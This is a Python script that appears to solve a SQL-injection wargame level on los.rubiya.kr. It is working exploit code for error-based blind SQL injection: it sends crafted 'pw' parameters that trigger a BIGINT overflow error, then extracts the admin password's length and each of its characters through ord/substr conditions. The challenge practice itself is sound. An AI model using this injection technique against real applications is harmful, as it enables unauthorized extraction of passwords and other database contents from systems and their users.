import requests
import urllib.parse
import string

cookies={'PHPSESSID': ''}

error="BIGINT value is out of range in '(9999999999 * 9999999999)'"
length_pass=0
for x in range(40):
    url="https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw='"+ urllib.parse.quote(" or id='admin' and if(length(pw) = {}, 9999999999*9999999999, 0)#".format(x))
    print(url)
    res = requests.get(url,cookies=cookies)
    #print(res.text)
    if error in res.text:
        print("Password Lenght is "+str(x))
        length_pass=x
        break
print(length_pass)







pwd = ''


for i in range(1, length_pass+1):
    for j in range(48, 122):
        url="https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw='"+ urllib.parse.quote(" or id='admin' and if(ord(substr(pw,{},1))={}, 9999999999*9999999999, 0)#".format(str(i),j)) #substring(pw,1,1)=0
        print(url)
        req = requests.get(url, cookies=cookies)
        #print(pwd)
        if error in req.text:
            print(pwd)
            pwd += chr(j)
            break

print(pwd)
